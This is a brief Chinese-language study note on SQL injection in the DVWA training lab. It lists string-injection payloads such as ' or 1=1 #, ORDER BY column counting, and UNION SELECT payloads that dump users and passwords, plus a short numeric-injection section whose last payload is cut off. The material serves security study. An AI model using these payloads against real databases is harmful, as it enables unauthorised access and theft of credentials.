<!-- 
title: 11-DVWA
sort: 
--> 

## SQL

### 字符注入

> 使用`1+2`测试输出
>
> `SELECT xx FROM x WHERE id = $id;`

1. `' or 1=1 or ' `

   > 假 真 假 -》全部

2. `' or '1'='1 `

   > 假 真 -》全部

3. `' or 1=1 #`

   > 假 真 注释‘

### 查询

1. 查询共有几行

   `1' order by 1 #`

   `1' order by 2 #`

   `1' order by 3 #`

   报错

2. 联合查询

   `1' union select 1,2 #`

   `1' union select user(),database() #`

   `1' union select user,password from users #`

## 数字注入

> 引号会被转义
>
> `1+2`对于算式会运算后进行查询

`1 union select user,password from use`